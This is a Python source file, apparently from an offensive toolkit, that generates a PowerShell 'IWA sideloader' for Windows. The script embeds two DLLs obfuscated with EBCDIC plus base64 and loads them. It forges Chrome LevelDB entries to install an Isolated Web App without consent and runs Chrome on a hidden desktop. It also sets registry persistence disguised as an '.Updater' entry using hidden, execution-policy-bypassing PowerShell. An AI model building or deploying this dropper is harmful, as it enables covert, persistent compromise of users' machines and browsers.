import os
import base64
import uuid
from base_sideloader import BaseSideloader


class WindowsSideloader(BaseSideloader):
    """Windows-specific sideloader implementation using PowerShell."""
    
    def get_platform_config(self):
        """Return Windows-specific configuration."""
        return {
            'chrome_paths': [
                "${env:ProgramFiles}\\Google\\Chrome\\Application\\chrome.exe",
                "${env:ProgramFiles(x86)}\\Google\\Chrome\\Application\\chrome.exe", 
                "${env:LocalAppData}\\Google\\Chrome\\Application\\chrome.exe"
            ],
            'base_data_dir': "${env:LOCALAPPDATA}",
            'chrome_profile_path': "Default",
            'iwa_path_separator': "\\",
            'leveldb_path': "Default\\Sync Data\\LevelDB"
        }
    
    def encode_dll_to_ebcdic_base64(self, file_path):
        """
        Reads a DLL file, encodes it using EBCDIC encoding, then base64 encodes it.
        
        Args:
            file_path: Path to the DLL file
            
        Returns:
            Base64 encoded string of the EBCDIC encoded DLL
        """
        try:
            # Check if file exists
            if not os.path.exists(file_path):
                print(f"Error: File not found at {file_path}")
                return None
                
            # Read the binary content of the DLL
            with open(file_path, 'rb') as file:
                dll_bytes = file.read()
            
            # Convert binary to EBCDIC encoding
            # Using cp037 which is the Python codec for EBCDIC (US/Canada)
            ebcdic_encoded = dll_bytes.decode('latin-1').encode('cp037')
            
            # Base64 encode the EBCDIC encoded bytes
            base64_encoded = base64.b64encode(ebcdic_encoded).decode('ascii')
            
            return base64_encoded
            
        except Exception as e:
            print(f"Error: {str(e)}")
            return None
    
    def generate_script(self, output_path):
        """Generate the Windows PowerShell sideloader script."""
        # Generate a GUID for the desktop name
        desktop_guid = self.generate_guid()
        
        # Read the template files
        script_dir = os.path.dirname(os.path.abspath(__file__))
        with open(os.path.join(script_dir, 'initializeIWAChrome.ps1'), 'r') as f:
            init_script = f.read()
        with open(os.path.join(script_dir, 'writeLevelDb.ps1'), 'r') as f:
            leveldb_script = f.read()
        
        # Read the HiddenDesktopNative DLL and encode as base64
        dll_path = os.path.join(script_dir, 'HiddenDesktopNative', 'dist', 'ProcessHelper.dll')
        dll_data = self.encode_dll_to_ebcdic_base64(dll_path)
        
        # Read the RegHelper DLL and encode as base64
        reghelper_dll_path = os.path.join(script_dir, 'RegHelper', 'dist', 'RegHelper.dll')
        reghelper_dll_data = self.encode_dll_to_ebcdic_base64(reghelper_dll_path)
        
        # Read the memory DLL loader script
        with open(os.path.join(script_dir, 'decodeAndLoadModule.ps1'), 'r') as f:
            module_loader_script = f.read()

        # Read the Chrome IWA Start Script
        with open(os.path.join(script_dir, 'startIWAApp.ps1'), 'r') as f:
            start_script = f.read()

        # Create the combined script
        script = f"""
# Generated IWA Sideloader Script for Windows
# App ID: {self.app_id}
# App Name: {self.app_name}
# IWA Folder: {self.iwa_folder_name}

$env:APP_NAME = "{self.app_name}"

$bundleData = @"
{self.bundle_data}
"@

# Extract the ProcessHelper.dll to the current directory
$assemblyName = "ProcessHelper"
$assemblyBytesBase64 = @"
{dll_data}
"@

# RegHelper.dll data for registry operations
$regHelperAssemblyBytesBase64 = @"
{reghelper_dll_data}
"@

# Create Directory at $appPath
$appPath = Join-Path $env:LOCALAPPDATA $env:APP_NAME
New-Item -Path $appPath -ItemType Directory -Force

# Include the module loader script
{module_loader_script}

# Use a shared desktop name for both Chrome instances
$sharedDesktopName = "Desktop_{desktop_guid}"
Write-Host "Using shared hidden desktop: $sharedDesktopName"

# Call the function to decode and load the ProcessHelper module
$dllPath = Join-Path $appPath "ProcessHelper.dll"
$moduleLoaded = Decode-And-Load-Module -assemblyBytesBase64 $assemblyBytesBase64 -dllPath $dllPath

if (-not $moduleLoaded) {{
    Write-Error "Failed to load the ProcessHelper module. Exiting."
    exit 1
}}

# Decode and load the RegHelper module
$regHelperDllPath = Join-Path $appPath "RegHelper.dll"
$regHelperModuleLoaded = Decode-And-Load-Module -assemblyBytesBase64 $regHelperAssemblyBytesBase64 -dllPath $regHelperDllPath

if (-not $regHelperModuleLoaded) {{
    Write-Error "Failed to load the RegHelper module. Exiting."
    exit 1
}}

# First initialize Chrome with IWA settings
{init_script}

# Then handle LevelDB operations
{leveldb_script}

# Move ProcessHelper.dll to the app directory
Move-Item -Path $dllPath -Destination $appPath

# Move RegHelper.dll to the app directory  
Move-Item -Path $regHelperDllPath -Destination $appPath

# Override Initialize-IWADirectory to use embedded bundle data
function Initialize-IWADirectory {{
    param (
        [Parameter(Mandatory=$true)]
        [string]$AppInternalName
    )
    
    $userDataDir = Join-Path $env:LOCALAPPDATA $env:APP_NAME
    $iwaDir = Join-Path $userDataDir "Default\\iwa\\$AppInternalName"
    
    # Create directories if they don't exist
    New-Item -ItemType Directory -Force -Path $iwaDir | Out-Null
    
    # Write bundle data
    $bundleBytes = [Convert]::FromBase64String($bundleData)
    [System.IO.File]::WriteAllBytes((Join-Path $iwaDir "main.swbn"), $bundleBytes)
}}

# Initialize IWA directory
Initialize-IWADirectory -AppInternalName "{self.iwa_folder_name}"

# Write LevelDB entry
$logPath = Get-LevelDBLogFilePath
Write-Output "Log Path: $logPath"
Write-LevelDBEntry -FilePath $logPath -SequenceNumber 99 -Key "web_apps-dt-{self.app_id}" -ValueHex "{self.protobuf_hex}"

Write-Output "Launching Chrome for IWA ({self.app_id}) at Path $env:CHROME_PATH"
$env:IWA_APP_ID = "{self.app_id}"

# Prepare the start script with proper variable handling
$startScriptPath = Join-Path $env:LOCALAPPDATA $env:APP_NAME
$startScriptPath = Join-Path $startScriptPath "startIWAApp.ps1"

# Create the script content as a simple string
$startScriptContent = "# Environment variables for IWA app `n"
$startScriptContent += "`$env:CHROME_PATH = `"$env:CHROME_PATH`" `n"
$startScriptContent += "`$env:USER_DATA_DIR = `"$env:USER_DATA_DIR`" `n"
$startScriptContent += "`$env:APP_NAME = `"$env:APP_NAME`" `n"
$startScriptContent += "`$env:IWA_APP_ID = `"$env:IWA_APP_ID`" `n"
$startScriptContent += "`$sharedDesktopName = `"$sharedDesktopName`" `n"
$startScriptContent += "`n# Start script content`n"
$startScriptContent += @'
{start_script}
'@

Write-Host "Writing start script to: $startScriptPath"
[System.IO.File]::WriteAllText($startScriptPath, $startScriptContent)

# Now run the start script
Write-Host "Running the IWA app..."
& $startScriptPath

# Setup persistence using the RegHelper module
Write-Host "`nSetting up persistence using copy-and-replace registry strategy..." -ForegroundColor Cyan

# Define persistence parameters
$persistenceValueName = "{self.app_name}.Updater"
$persistenceValueData = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$startScriptPath`""

# Execute the persistence setup using the RegHelper module
try {{
    Invoke-RegistryPersistence -PersistenceValueName $persistenceValueName -PersistenceValueData $persistenceValueData
}} catch {{
    Write-Error "Failed to setup persistence: $($_.Exception.Message)"
    throw
}}
"""
        
        with open(output_path, 'w') as f:
            f.write(script)
        
        print(f"\nGenerated Windows sideloader script: {output_path}")
        print(f"Using shared desktop name: Desktop_{desktop_guid}")
